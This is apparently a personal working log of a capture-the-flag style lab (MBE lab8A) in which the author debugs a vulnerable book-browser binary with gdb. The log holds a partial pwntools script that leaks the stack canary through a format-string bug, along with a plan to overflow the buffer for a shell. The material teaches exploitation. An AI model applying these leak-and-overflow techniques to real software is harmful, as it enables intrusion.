@@ -1,0 +1,1617 @@
+OK, we know there's some sort of custom canary, however I am kinda unsure what is it about  - why would we want to reach to that point where:
+    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
+    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
+        printf("\n\nWoah There\n");
+        // why are you trying to break my program q-q
+        exit(EXIT_FAILURE);
+    }
+
+    // protected by my CUSTOM cookie - so soooo safe now
+    return;
+It does not give us the flag.
+
+Also, it looks like NOT overwriting the pointer will leave to the custom cookie failing:
+
+lab8A@warzone:~$ /levels/lab08/lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: A
+A
+
+*************************************************
+{|} Aristote's Metaphysics 350 B.C. Book VIII {|}
+*************************************************
+
+To return to the difficulty which has been stated with respect both to definitions and to numbers, what is the cause of their unity? In the case of all things which have several parts and in which the totality is not, as it were, a mere heap, but the whole is something beside the parts, there is a cause; for even in bodies contact is the cause of unity in some cases, and in others viscosity or some other such quality. And a definition is a set of words which is one not by being connected together, like the Iliad, but by dealing with one object.-What then, is it that makes man one; why is he one and not many, e.g. animal + biped, especially if there are, as some say, an animal-itself and a biped-itself? Why are not those Forms themselves the man, so that men would exist by participation not in man, nor in-one Form, but in two, animal and biped, and in general man would be not one but more than one thing, animal and biped?
+
+...please turn to page 394...
+
+..I like to read ^_^ <==  HELLO
+
+
+Woah There
+
+Yeah.
+    read(STDIN, buf, 2048); // >> read a lot every day ! // another big overflow bit no bad chars
+	// so we must make global_addr_check == 0xdeadbeef, not sure if this is the cookie itself or just sth we must overwrite (and thus also steal and overwrite the stak protector in selectABook() function)... but fuck it, I want shell - well OK, we won't get a shell by overwriting RET if we fail to bypass this
+    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
+	        printf("\n\nWoah There\n");
+        // why are you trying to break my program q-q
+        exit(EXIT_FAILURE);
+    }
+
+    // protected by my CUSTOM cookie - so soooo safe now
+    return;
+
+The thing is that it does not look like I actually need to ever call that function.
+
+void selectABook() {
+    /* Our Apologies,the interface is currently under developement */
+    char buf_secure[512];
+    scanf("%s", buf_secure); // buffer overflow
+    printf(buf_secure);	// and format string, so we can leak the layout and the random canary. Weird, to me it seems like we do not need the nested selectABook() calls, neither we need to bypass the custom canary check with that overwrite via read()
+    if(strcmp(buf_secure, "A") == 0){
+        readA();
+    }else if(strcmp(buf_secure,"F") == 0){
+        readB();
+    }else if(*buf_secure == '\x00'){
+        readC();
+    }else if(buf_secure == 1337){
+        printf("\nhackers dont have time to read.\n");
+        exit(EXIT_FAILURE);
+    }else{
+        printf("\nWhat were you thinking, that isn't a good book.");
+        selectABook(); // recurrence, nice :D
+    }
+    return;
+}
+
+OK, we DO need the recurrence :)
+
+In first call we leak the canary over format string. In the second call we overflow the buffer using the leaked canary value and we get our shell. Still not sure why we would want to mess with the findSomeWords() function to trick it to display "Whew you made it", but surely we can.
+
+
+gdb-peda$ disas selectABook
+Dump of assembler code for function selectABook:
+   0x08048f0b <+0>:     push   ebp			< -- preamble
+   0x08048f0c <+1>:     mov    ebp,esp		< -- preamble
+   0x08048f0e <+3>:     sub    esp,0x20c	< -- preamble
+=> 0x08048f14 <+9>:     mov    eax,gs:0x14
+   0x08048f1a <+15>:    mov    DWORD PTR [ebp-0x4],eax
+   0x08048f1d <+18>:    xor    eax,eax
+   0x08048f1f <+20>:    lea    eax,[ebp-0x204]
+   0x08048f25 <+26>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048f29 <+30>:    mov    DWORD PTR [esp],0x80bf7cb
+   0x08048f30 <+37>:    call   0x804f550 <__isoc99_scanf>
+   0x08048f35 <+42>:    lea    eax,[ebp-0x204]
+   0x08048f3b <+48>:    mov    DWORD PTR [esp],eax
+   
+So, our sample canary is in EAX now:
+
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xb845c700
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xffffffff
+EDX: 0x80ed4d4 --> 0x0
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f4 --> 0xbffff718 --> 0x8049990 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff4e8 --> 0x0
+EIP: 0x8048f1a (<selectABook+15>:       mov    DWORD PTR [ebp-0x4],eax)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048f0c <selectABook+1>:   mov    ebp,esp
+   0x8048f0e <selectABook+3>:   sub    esp,0x20c
+   0x8048f14 <selectABook+9>:   mov    eax,gs:0x14
+=> 0x8048f1a <selectABook+15>:  mov    DWORD PTR [ebp-0x4],eax
+
+Main has this as well. Looks like the gcc canary implementation:
+
+Dump of assembler code for function main:
+   0x0804917b <+0>:     push   ebp
+   0x0804917c <+1>:     mov    ebp,esp
+   0x0804917e <+3>:     sub    esp,0x1c
+   0x08049181 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
+   0x08049184 <+9>:     mov    DWORD PTR [ebp-0x8],eax
+   0x08049187 <+12>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x0804918a <+15>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804918d <+18>:    mov    eax,gs:0x14				<---
+   0x08049193 <+24>:    mov    DWORD PTR [ebp-0x4],eax
+   0x08049196 <+27>:    xor    eax,eax
+   0x08049198 <+29>:    mov    eax,ds:0x80ec4c0			<---
+   0x0804919d <+34>:    mov    DWORD PTR [esp+0xc],0x0
+   
+OK, how do I display ds:0x80ec4c0?
+
+Hah, 0x80ec4c0 is stdout.
+
+This is weird. We are in the call of selectABook() from main:
+
+
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x0804917b <+0>:     push   ebp
+   0x0804917c <+1>:     mov    ebp,esp
+   0x0804917e <+3>:     sub    esp,0x1c
+   0x08049181 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
+   0x08049184 <+9>:     mov    DWORD PTR [ebp-0x8],eax
+   0x08049187 <+12>:    mov    eax,DWORD PTR [ebp+0xc]
+   0x0804918a <+15>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804918d <+18>:    mov    eax,gs:0x14
+   0x08049193 <+24>:    mov    DWORD PTR [ebp-0x4],eax
+   0x08049196 <+27>:    xor    eax,eax
+   0x08049198 <+29>:    mov    eax,ds:0x80ec4c0
+   0x0804919d <+34>:    mov    DWORD PTR [esp+0xc],0x0
+   0x080491a5 <+42>:    mov    DWORD PTR [esp+0x8],0x2
+   0x080491ad <+50>:    mov    DWORD PTR [esp+0x4],0x0
+   0x080491b5 <+58>:    mov    DWORD PTR [esp],eax
+   0x080491b8 <+61>:    call   0x804fce0 <setvbuf>
+   0x080491bd <+66>:    mov    DWORD PTR [esp],0x80c0891
+   0x080491c4 <+73>:    call   0x804fb60 <puts>
+   0x080491c9 <+78>:    mov    DWORD PTR [esp],0x80c0894
+   0x080491d0 <+85>:    call   0x804f4f0 <printf>
+   0x080491d5 <+90>:    call   0x8048f0b <selectABook>	<-- THIS 
+   0x080491da <+95>:    mov    DWORD PTR [esp],0x80c0974	< -- so this should be our saved ret
+   0x080491e1 <+102>:   call   0x804fb60 <puts>
+   0x080491e6 <+107>:   call   0x80490dd <findSomeWords>
+   0x080491eb <+112>:   mov    DWORD PTR [esp],0x80c0993
+   0x080491f2 <+119>:   call   0x804fb60 <puts>
+   0x080491f7 <+124>:   mov    eax,0x0
+   0x080491fc <+129>:   mov    edx,DWORD PTR [ebp-0x4]
+   0x080491ff <+132>:   xor    edx,DWORD PTR gs:0x14
+   0x08049206 <+139>:   je     0x804920d <main+146>
+   0x08049208 <+141>:   call   0x806f490 <__stack_chk_fail>
+   0x0804920d <+146>:   leave
+   0x0804920e <+147>:   ret
+End of assembler dump.
+
+But 0x080491da is nowhere to be found:
+
+gdb-peda$ x/100wx $esp
+0xbffff4e8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4f8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff508:     0x00000000      0xbffff5fc      0x08048034      0x00000000
+0xbffff518:     0x0809aa11      0x0807079d      0xbffff57a      0x00000000
+0xbffff528:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff538:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff548:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff558:     0x080ec570      0x00000018      0x00000000      0x00002710
+0xbffff568:     0x00000014      0x00000003      0x00000028      0x00000003
+0xbffff578:     0x00000000      0x00000038      0x00000000      0x0000005b
+0xbffff588:     0x00000000      0x0000006e      0x00000000      0x00000077
+0xbffff598:     0x00000000      0x0000007c      0x00000000      0x00000000
+
+Also, breakpoint at ret:
+   0x08049208 <+141>:   call   0x806f490 <__stack_chk_fail>
+   0x0804920d <+146>:   leave
+   0x0804920e <+147>:   ret	<-- here
+   
+Was NOT hit. Ah what the fuck.
+
+Once again, after getting some sleep:
+
+This is a breakpoint right before calling:
+
+   0x80491d0 <main+85>: call   0x804f4f0 <printf>
+=> 0x80491d5 <main+90>: call   0x8048f0b <selectABook>
+   0x80491da <main+95>: mov    DWORD PTR [esp],0x80c0974
+   0x80491e1 <main+102>:        call   0x804fb60 <puts>
+   0x80491e6 <main+107>:        call   0x80490dd <findSomeWords>
+   0x80491eb <main+112>:        mov    DWORD PTR [esp],0x80c0993
+No argument
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff70c --> 0x80c0894 ('*' <repeats 46 times>, "\n{|}  Welcome to QUEND's Beta-Book-Browser  {|}\n", '*' <repeats 46 times>, "\n\n\t==> reading is for everyone <==\n\t[+] Enter Your Favorite "...)
+0004| 0xbffff710 --> 0x0
+0008| 0xbffff714 --> 0x2
+0012| 0xbffff718 --> 0x0
+0016| 0xbffff71c --> 0xbffff7b4 --> 0xbffff8d3 ("/tmp/lab8A")
+0020| 0xbffff720 --> 0x1
+0024| 0xbffff724 --> 0x943d4e00
+0028| 0xbffff728 --> 0x8049990 (<__libc_csu_fini>:      push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080491d5 in main ()
+gdb-peda$ x/50wx $esp
+0xbffff70c:     0x080c0894      0x00000000      0x00000002      0x00000000
+0xbffff71c:     0xbffff7b4      0x00000001      0x943d4e00      0x08049990
+0xbffff72c:     0x080493da      0x00000001      0xbffff7b4      0xbffff7bc
+0xbffff73c:     0x00000000      0x00000000      0x080481a8      0x00000000
+0xbffff74c:     0x080ec00c      0x08049990      0x093585fc      0xfffcd493
+0xbffff75c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff76c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff77c:     0x00000000      0x00000001      0x00000000      0x00000000
+0xbffff78c:     0x08048d4b      0x0804917b      0x00000001      0xbffff7b4
+0xbffff79c:     0x080498f0      0x08049990      0x00000000      0xbffff7ac
+0xbffff7ac:     0x00000000      0x00000001      0xbffff8d3      0x00000000
+0xbffff7bc:     0xbffff8de      0xbffff8f0      0xbffff900      0xbffff915
+0xbffff7cc:     0xbffff936      0xbffff949
+gdb-peda$
+
+So 0x80491da should go to SAVED RET on the stack once we step in.
+
+s
+
+Uff, so far so good, it's here:
+
+gdb-peda$ x/50wx $esp
+0xbffff708:     0x080491da      0x080c0894      0x00000000      0x00000002
+0xbffff718:     0x00000000      0xbffff7b4      0x00000001      0x943d4e00
+0xbffff728:     0x08049990      0x080493da      0x00000001      0xbffff7b4
+0xbffff738:     0xbffff7bc      0x00000000      0x00000000      0x080481a8
+0xbffff748:     0x00000000      0x080ec00c      0x08049990      0x093585fc
+0xbffff758:     0xfffcd493      0x00000000      0x00000000      0x00000000
+0xbffff768:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff778:     0x00000000      0x00000000      0x00000001      0x00000000
+0xbffff788:     0x00000000      0x08048d4b      0x0804917b      0x00000001
+0xbffff798:     0xbffff7b4      0x080498f0      0x08049990      0x00000000
+0xbffff7a8:     0xbffff7ac      0x00000000      0x00000001      0xbffff8d3
+0xbffff7b8:     0x00000000      0xbffff8de      0xbffff8f0      0xbffff900
+0xbffff7c8:     0xbffff915      0xbffff936
+gdb-peda$
+
+OK fine, this is why I could not find it. It allocates shitload of space on the stack here.
+
+Let's see the stack again:
+
+
+0xbffff6f8:     0x080481a8      0x00000000      0x943d4e00      0xbffff728		<-- looks like the canary, then saved EBP
+0xbffff708:     0x080491da      0x080c0894      0x00000000      0x00000002		<-- 0xbffff708: saved ret 0x080491da
+0xbffff718:     0x00000000      0xbffff7b4      0x00000001      0x943d4e00
+
+And yeah, it's from here (the preamble):
+Dump of assembler code for function selectABook:
+   0x08048f0b <+0>:     push   ebp
+   0x08048f0c <+1>:     mov    ebp,esp
+   0x08048f0e <+3>:     sub    esp,0x20c
+   0x08048f14 <+9>:     mov    eax,gs:0x14
+   0x08048f1a <+15>:    mov    DWORD PTR [ebp-0x4],eax
+   
+gdb-peda$ x $ebp-0x4
+0xbffff700:     0x943d4e00
+   
+Comes from eax, gs:0x14, it's pretty much all we need to know now. The value gets automatically retrieved from gs:0x14 and put on the stack right after saved stack frame, before any local args.
+
+OK, fine :)
+
+=> 0x8048f25 <selectABook+26>:  mov    DWORD PTR [esp+0x4],eax
+   0x8048f29 <selectABook+30>:  mov    DWORD PTR [esp],0x80bf7cb
+   0x8048f30 <selectABook+37>:  call   0x804f550 <__isoc99_scanf>
+   
+Right. 
+EAX: 0xbffff500 --> 0x0
+
+So, the distance between the beginning of our buffer and the saved canary is:
+
+gdb-peda$ p 0xbffff700-0xbffff500
+$1 = 0x200	(512 DEC)
+
+OK, awesome. So our format string should be:
+
+... %$127p ... %$128p ... %$129p ... %$130p ...
+
+We should be able to leak this. We are not trying to leak the saved RET of printf() itself (which would be higher on the stack than the buf_secure itself), but instead stuff that is already below it - the saved ret of the parent function along with its canary.
+
+OK, we'll play with pwntools on DEBUG mode now.
+
+For an unknown reason the format string did not want to work for me for the %$130p format, whereas $130 is the number of the successive dword on the stack. Which is weird, because this is exactly what worked for me here: https://hackingiscool.pl/heap-overflow-with-stack-pivoting-format-string-leaking-first-stage-rop-ing-to-shellcode-after-making-it-executable-on-the-heap-on-a-statically-linked-binary-mbe-lab7a/
+
+Getting rid of the "$" signs did the trick.
+
+So:
+
+from pwn import *
+settings = {
+    "binary"        : "/tmp/lab8A",
+}
+def exploit():
+#   p.sendlineafter("Enter Your Favorite Author's Last Name: ","127:%127p,128:%128p,129:%129p,130:%130p.")
+    p.sendlineafter("Enter Your Favorite Author's Last Name: ","129:%129p,130:%130p,131:%131p,132:%132p,")
+    # OK, why does it now work with %NUMp format, instead of %$NUMp format, as in https://hackingiscool.pl/heap-overflow-with-stack-pivoting-format-string-leaking-first-stage-rop-ing-to-shellcode-after-making-it-executable-on-the-heap-on-a-statically-linked-binary-mbe-lab7a/ ? I am confused :)
+    p.recv()
+
+    # print out PID and pause, so we can easily attach with gdb from another console (ptrace_scope needs to be 0 for this, otherwise you either need pwnlib.gdb attaching OR root)
+    #print("PID: "+str(pidof(p)))
+    #pause()
+    #p.sendline("0") # quit
+    #p.recv()
+    return 0
+# Initial setup
+if __name__  == "__main__":
+    binary = ELF(settings['binary'])
+    context.log_level = 'debug'
+    p = process(binary.path,stdin=PTY)
+    exploit()
+	
+Output:
+
+[DEBUG] Received 0x24e bytes:
+    '129:                                                                                                                       0xbffff490,130:                                                                                                                        0x3a393231,131:                                                                                                                         0x39323125,132:                                                                                                                          0x33312c70,\n'
+    "What were you thinking, that isn't a good book."
+[*] Stopped process '/tmp/lab8A' (pid 6193)
+
+lab8A@warzone:/tmp$
+
+OK, 0xbffff490 is definitely the saved EBP. So 0x3a393231 should be the stack canary. Let's see how this changes once we run again:
+
+[DEBUG] Received 0x24e bytes:
+    '129:                                                                                                                       0xbffff490,130:                                                                                                                        0x3a393231,131:                                                                                                                         0x39323125,132:                                                                                                                          0x33312c70,\n'
+    "What were you thinking, that isn't a good book."
+[*] Stopped process '/tmp/lab8A' (pid 6202)
+lab8A@warzone:/tmp$
+
+Shit, it's the same :) Well OK then, let's hook GDB and see what's what.
+
+
+
+gdb-peda$ x/400wx $esp
+0xbffff488:     0x080bf7cb      0xbffff490      0x3a393231      0x39323125
+0xbffff498:     0x33312c70      0x31253a30      0x2c703033      0x3a313331
+0xbffff4a8:     0x31333125      0x33312c70      0x31253a32      0x2c703233
+0xbffff4b8:     0x0809aa00      0x0807079d      0xbffff51a      0x00000000
+0xbffff4c8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4d8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4e8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4f8:     0x080ec570      0x00000018      0x00000000      0x00002710
+0xbffff508:     0x00000014      0x00000003      0x00000028      0x00000003
+0xbffff518:     0x00000000      0x00000038      0x00000000      0x0000005b
+0xbffff528:     0x00000000      0x0000006e      0x00000000      0x00000077
+0xbffff538:     0x00000000      0x0000007c      0x00000000      0x00000000
+0xbffff548:     0x00000000      0x080ec540      0x00000003      0x00000004
+0xbffff558:     0xbffff5f8      0x08059a29      0x0000656e      0x00000000
+0xbffff568:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff578:     0x080ec570      0x000009b8      0x080efff8      0x00002710
+0xbffff588:     0x000009b0      0x0000005e      0x000009c8      0x00000137
+0xbffff598:     0x00000026      0x0000005e      0x00000004      0x0000005f
+0xbffff5a8:     0x00000000      0x0000006e      0x00000000      0x00000077
+0xbffff5b8:     0x00000000      0x0000007c      0x080ebfdc      0x080ec200
+0xbffff5c8:     0x00000001      0x080ec247      0x0806d762      0x00000001
+0xbffff5d8:     0x08052a31      0x00000001      0x080ec247      0x00000001
+0xbffff5e8:     0x00000000      0x080d1f19      0x080effd0      0x000000c2
+0xbffff5f8:     0x080ec200      0x0000000a      0x080ec247      0x080ed4d4
+0xbffff608:     0x08051bd4      0x080ec200      0x080ec247      0x00000001
+0xbffff618:     0x08053a35      0x080ec200      0x080ec247      0x00000000
+0xbffff628:     0x080547ff      0x00000001      0x0000000a      0x080c0891
+0xbffff638:     0x0805325d      0x080ec200      0xffffffff      0x080ec200
+0xbffff648:     0x080539c8      0x080ec200      0x080ec247      0x00000001
+0xbffff658:     0x080ec200      0x080ec200      0x00000002      0x080c0891
+0xbffff668:     0x080481a8      0x00000000      0x080ec00c      0xbffff6b8
+0xbffff678:     0x0804f510      0x080ec200      0x080c0894      0xbffff6a0
+0xbffff688:     0x080481a8      0x00000000      0x4c65a000      0xbffff6b8	<-- 0xbffff6b8 STACK FRAME, 0x4c65a000 CANARY
+0xbffff698:     0x080491da      0x080c0894      0x00000000      0x00000002	<-- 0x080491da SAVED RET
+0xbffff6a8:     0x00000000      0xbffff744      0x00000001      0x4c65a000  <-- canary again
+0xbffff6b8:     0x08049990      0x080493da      0x00000001      0xbffff744
+0xbffff6c8:     0xbffff74c      0x00000000      0x00000000      0x080481a8
+0xbffff6d8:     0x00000000      0x080ec00c      0x08049990      0xcd69d21a
+0xbffff6e8:     0x3ba36375      0x00000000      0x00000000      0x00000000
+0xbffff6f8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff708:     0x00000000      0x00000000      0x00000001      0x00000000
+
+
+What were you thinking, that isn't a good book.^C
+lab8A@warzone:/tmp$ ./lab8A
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: %130p
+                                                                                                                        0xbffff4a0
+What were you thinking, that isn't a good book.
+%1p
+0xbffff28c
+What were you thinking, that isn't a good book.%256p
+                                                                                                                                                                                                                                                      0xbffff078
+What were you thinking, that isn't a good book.%s
+%s
+What were you thinking, that isn't a good book.%1212p
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  0xbfffec50
+What were you thinking, that isn't a good book.%1p
+0xbfffea3c
+What were you thinking, that isn't a good book.%2p
+0xbfffe828
+What were you thinking, that isn't a good book.%3p
+0xbfffe614
+What were you thinking, that isn't a good book.%4p
+0xbfffe400
+
+Interestingly, this works as expected when dealt with manually. When attached from GDB, the process exits in the second selectABook() call fuck knows why.
+ 
+Well, OK. When did gdb /tmp/lab8B, then break *(selectABook+0) and run it keeps behaving the same. Maybe I was just too drunk when I interacted with this last time. Anyway, now I am just too fucking tired.
+
+
+OK. So once again, we want to establish exactly what is the value of the canary and what is its location to our printf() buffer we use to exploit the format string.
+
+Two breaks: 
+1) main, right before calling selectABook() for the first time
+2) selectABook(), the very beginning, so we can observe the stack. 
+3) selectABook() + right after scanf() call, to see again how the stack looks like
+Also, we'll fill the buf[512] with A-s.
+
+break *0x080491d0
+break *0x08048f0b
+break *0x08048f35
+
+Here we go.
+
+=> 0x80491d0 <main+85>: call   0x804f4f0 <printf>
+   0x80491d5 <main+90>: call   0x8048f0b <selectABook>
+   0x80491da <main+95>: mov    DWORD PTR [esp],0x80c0974
+   0x80491e1 <main+102>:        call   0x804fb60 <puts>
+   0x80491e6 <main+107>:        call   0x80490dd <findSomeWords>
+Guessed arguments:
+arg[0]: 0x80c0894 ('*' <repeats 46 times>, "\n{|}  Welcome to QUEND's Beta-Book-Browser  {|}\n", '*' <repeats 46 times>, "\n\n\t==> reading is for everyone <==\n\t[+] Enter Your Favorite "...)
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6fc --> 0x80c0894 ('*' <repeats 46 times>, "\n{|}  Welcome to QUEND's Beta-Book-Browser  {|}\n", '*' <repeats 46 times>, "\n\n\t==> reading is for everyone <==\n\t[+] Enter Your Favorite "...)
+0004| 0xbffff700 --> 0x0
+0008| 0xbffff704 --> 0x2
+0012| 0xbffff708 --> 0x0
+0016| 0xbffff70c --> 0xbffff7a4 --> 0xbffff8c1 ("/levels/lab08/lab8A")
+0020| 0xbffff710 --> 0x1
+0024| 0xbffff714 --> 0xf8586c00
+0028| 0xbffff718 --> 0x8049990 (<__libc_csu_fini>:      push   ebx)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080491d0 in main ()
+
+gdb-peda$ x/100wx $esp
+0xbffff6fc:     0x080c0894      0x00000000      0x00000002      0x00000000
+0xbffff70c:     0xbffff7a4      0x00000001      0xf8586c00      0x08049990
+0xbffff71c:     0x080493da      0x00000001      0xbffff7a4      0xbffff7ac
+0xbffff72c:     0x00000000      0x00000000      0x080481a8      0x00000000
+0xbffff73c:     0x080ec00c      0x08049990      0x0e0d62ff      0xf8c41390
+0xbffff74c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff75c:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff76c:     0x00000000      0x00000001      0x00000000      0x00000000
+0xbffff77c:     0x08048d4b      0x0804917b      0x00000001      0xbffff7a4
+0xbffff78c:     0x080498f0      0x08049990      0x00000000      0xbffff79c
+0xbffff79c:     0x00000000      0x00000001      0xbffff8c1      0x00000000
+0xbffff7ac:     0xbffff8d5      0xbffff8e7      0xbffff8f7      0xbffff90c
+
+c
+
+=> 0x8048f0b <selectABook>:     push   ebp
+   0x8048f0c <selectABook+1>:   mov    ebp,esp
+   0x8048f0e <selectABook+3>:   sub    esp,0x20c
+   0x8048f14 <selectABook+9>:   mov    eax,gs:0x14
+   0x8048f1a <selectABook+15>:  mov    DWORD PTR [ebp-0x4],eax
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6f8 --> 0x80491da (<main+95>:      mov    DWORD PTR [esp],0x80c0974)
+0004| 0xbffff6fc --> 0x80c0894 ('*' <repeats 46 times>, "\n{|}  Welcome to QUEND's Beta-Book-Browser  {|}\n", '*' <repeats 46 times>, "\n\n\t==> reading is for everyone <==\n\t[+] Enter Your Favorite "...)
+0008| 0xbffff700 --> 0x0
+0012| 0xbffff704 --> 0x2
+0016| 0xbffff708 --> 0x0
+0020| 0xbffff70c --> 0xbffff7a4 --> 0xbffff8c1 ("/levels/lab08/lab8A")
+0024| 0xbffff710 --> 0x1
+0028| 0xbffff714 --> 0xf8586c00
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x08048f0b in selectABook ()
+
+Breakpoint 2, 0x08048f0b in selectABook ()
+gdb-peda$ x/100wx $esp
+0xbffff6f8:     0x080491da      0x080c0894      0x00000000      0x00000002 <-- so far only saved RET has been placed
+0xbffff708:     0x00000000      0xbffff7a4      0x00000001      0xf8586c00
+0xbffff718:     0x08049990      0x080493da      0x00000001      0xbffff7a4
+0xbffff728:     0xbffff7ac      0x00000000      0x00000000      0x080481a8
+0xbffff738:     0x00000000      0x080ec00c      0x08049990      0x0e0d62ff
+0xbffff748:     0xf8c41390      0x00000000      0x00000000      0x00000000
+0xbffff758:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff768:     0x00000000      0x00000000      0x00000001      0x00000000
+0xbffff778:     0x00000000      0x08048d4b      0x0804917b      0x00000001
+0xbffff788:     0xbffff7a4      0x080498f0      0x08049990      0x00000000
+0xbffff798:     0xbffff79c      0x00000000      0x00000001      0xbffff8c1
+0xbffff7a8:     0x00000000      0xbffff8d5      0xbffff8e7      0xbffff8f7
+0xbffff7b8:     0xbffff90c      0xbffff92d      0xbffff940      0xbffff94b
+0xbffff7c8:     0xbffffe6c      0xbffffe7d      0xbffffe89      0xbffffee7
+0xbffff7d8:     0xbffffefc      0xbfffff0b      0xbfffff14      0xbfffff25
+0xbffff7e8:     0xbfffff2e      0xbfffff3f      0xbfffff47      0xbfffff55
+0xbffff7f8:     0xbfffff87      0xbfffffa7      0xbfffffc6      0x00000000
+0xbffff808:     0x00000020      0xb7ffdd3c      0x00000021      0xb7ffd000
+0xbffff818:     0x00000010      0x078bfbff      0x00000006      0x00001000
+0xbffff828:     0x00000011      0x00000064      0x00000003      0x08048034
+0xbffff838:     0x00000004      0x00000020      0x00000005      0x00000006
+0xbffff848:     0x00000007      0x00000000      0x00000008      0x00000000
+0xbffff858:     0x00000009      0x08048d2a      0x0000000b      0x00000407
+0xbffff868:     0x0000000c      0x00000407      0x0000000d      0x00000408
+0xbffff878:     0x0000000e      0x00000408      0x00000017      0x00000000
+
+Interestingly, to note down -  the saved ret is stored at 0xbffff6f8 and has value of 0x080491da:
+gdb-peda$ x/2i 0x080491da
+   0x80491da <main+95>: mov    DWORD PTR [esp],0x80c0974
+   0x80491e1 <main+102>:        call   0x804fb60 <puts>
+   
+
+
+Because we are still before the canary routine.
+
+This is right after the canary was copied from gs:0x14 to eax (eax is now 0xf8586c00 - the value of the canary):
+
+EAX: 0xf8586c00
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0xffffffff
+EDX: 0x80ed4d4 --> 0x0
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6f4 --> 0xbffff718 --> 0x8049990 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff4e8 --> 0x0
+EIP: 0x8048f1d (<selectABook+18>:       xor    eax,eax)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048f0e <selectABook+3>:   sub    esp,0x20c
+   0x8048f14 <selectABook+9>:   mov    eax,gs:0x14
+   0x8048f1a <selectABook+15>:  mov    DWORD PTR [ebp-0x4],eax
+=> 0x8048f1d <selectABook+18>:  xor    eax,eax
+   0x8048f1f <selectABook+20>:  lea    eax,[ebp-0x204]
+   0x8048f25 <selectABook+26>:  mov    DWORD PTR [esp+0x4],eax
+   0x8048f29 <selectABook+30>:  mov    DWORD PTR [esp],0x80bf7cb
+   0x8048f30 <selectABook+37>:  call   0x804f550 <__isoc99_scanf>
+   
+OK, now we're after the routine:
+
+   0x8048f14 <selectABook+9>:   mov    eax,gs:0x14
+   0x8048f1a <selectABook+15>:  mov    DWORD PTR [ebp-0x4],eax
+   0x8048f1d <selectABook+18>:  xor    eax,eax
+=> 0x8048f1f <selectABook+20>:  lea    eax,[ebp-0x204]
+   0x8048f25 <selectABook+26>:  mov    DWORD PTR [esp+0x4],eax
+   0x8048f29 <selectABook+30>:  mov    DWORD PTR [esp],0x80bf7cb
+   0x8048f30 <selectABook+37>:  call   0x804f550 <__isoc99_scanf>
+   0x8048f35 <selectABook+42>:  lea    eax,[ebp-0x204]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4e8 --> 0x0
+0004| 0xbffff4ec --> 0x0
+0008| 0xbffff4f0 --> 0x0
+0012| 0xbffff4f4 --> 0x0
+0016| 0xbffff4f8 --> 0x0
+0020| 0xbffff4fc --> 0x0
+0024| 0xbffff500 --> 0x0
+0028| 0xbffff504 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048f1f in selectABook ()
+gdb-peda$
+
+OK, let's see the stack. ESP has a much smaller value now, because the stack grew:
+   0x8048f0e <selectABook+3>:   sub    esp,0x20c
+to hold the buff[512].
+
+So:
+
+gdb-peda$ x/300wx $esp
+0xbffff4e8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4f8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff508:     0x00000000      0xbffff5fc      0x08048034      0x00000000
+0xbffff518:     0x0809aa11      0x0807079d      0xbffff57a      0x00000000
